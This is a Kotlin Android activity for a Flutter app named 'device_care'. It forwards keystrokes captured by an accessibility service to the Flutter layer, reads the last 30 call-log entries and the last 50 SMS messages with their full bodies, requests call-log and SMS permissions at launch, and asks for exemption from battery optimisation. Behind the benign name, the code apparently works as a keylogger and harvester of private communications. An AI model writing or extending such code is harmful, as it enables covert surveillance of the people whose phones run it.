package com.shaonx.device_care

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.CallLog
import android.provider.Settings
import android.provider.Telephony
import android.text.TextUtils
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : FlutterActivity() {
    private val CHANNEL = "com.example.app/events"
    private val PERMISSION_REQUEST_CODE = 1001

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        val channel = MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)

        // Hook Flutter UI in — service will call this only when UI is alive
        MyAccessibilityService.flutterCallback = { text ->
            runOnUiThread {
                try {
                    channel.invokeMethod("onKeyStroke", text)
                } catch (e: Exception) {
                    // Flutter engine gone, safe to ignore
                }
            }
        }

        // Handle method calls from Flutter
        channel.setMethodCallHandler { call, result ->
            when (call.method) {
                "isAccessibilityEnabled" -> {
                    result.success(isAccessibilityServiceEnabled())
                }
                "openAccessibilitySettings" -> {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    result.success(null)
                }
                // Return last 30 call log entries as List<Map> to Flutter
                "getCallLogs" -> {
                    result.success(getCallLogs())
                }
                // Return last 50 SMS entries as List<Map> to Flutter
                "getSmsLogs" -> {
                    result.success(getSmsLogs())
                }
                else -> result.notImplemented()
            }
        }
    }

    /**
     * Query the last 30 call log entries and return as a list of maps
     * that Flutter can consume directly.
     */
    private fun getCallLogs(): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null, null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 30) {
                    val type = it.getInt(2)
                    val callType = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        else -> "Unknown"
                    }

                    results.add(mapOf(
                        "number" to (it.getString(0) ?: "Unknown"),
                        "name" to (it.getString(1) ?: ""),
                        "type" to callType,
                        "date" to dateFormat.format(Date(it.getLong(3))),
                        "duration" to it.getInt(4)
                    ))
                    count++
                }
            }
        } catch (e: SecurityException) {
            // Permission not granted
        }
        return results
    }

    /**
     * Query the last 50 SMS entries and return as a list of maps
     * that Flutter can consume directly.
     */
    private fun getSmsLogs(): List<Map<String, Any?>> {
        val results = mutableListOf<Map<String, Any?>>()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        try {
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE
                ),
                null, null,
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 50) {
                    val type = it.getInt(2)
                    val smsType = when (type) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "Received"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
                        else -> "Other"
                    }

                    results.add(mapOf(
                        "address" to (it.getString(0) ?: "Unknown"),
                        "body" to (it.getString(1) ?: ""),
                        "type" to smsType,
                        "date" to dateFormat.format(Date(it.getLong(3)))
                    ))
                    count++
                }
            }
        } catch (e: SecurityException) {
            // Permission not granted
        }
        return results
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedService = "$packageName/${MyAccessibilityService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabledServices)
        while (splitter.hasNext()) {
            if (splitter.next().equals(expectedService, ignoreCase = true)) return true
        }
        return false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestBatteryOptimizationExemption()
        // Request call log and SMS permissions at launch
        requestCommPermissions()
    }

    /**
     * Request READ_CALL_LOG and READ_SMS runtime permissions.
     * These are "dangerous" permissions on Android 6+ and must be requested at runtime.
     */
    private fun requestCommPermissions() {
        val permissionsNeeded = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS)
        }

        if (permissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsNeeded.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    override fun onDestroy() {
        MyAccessibilityService.flutterCallback = null
        super.onDestroy()
    }
}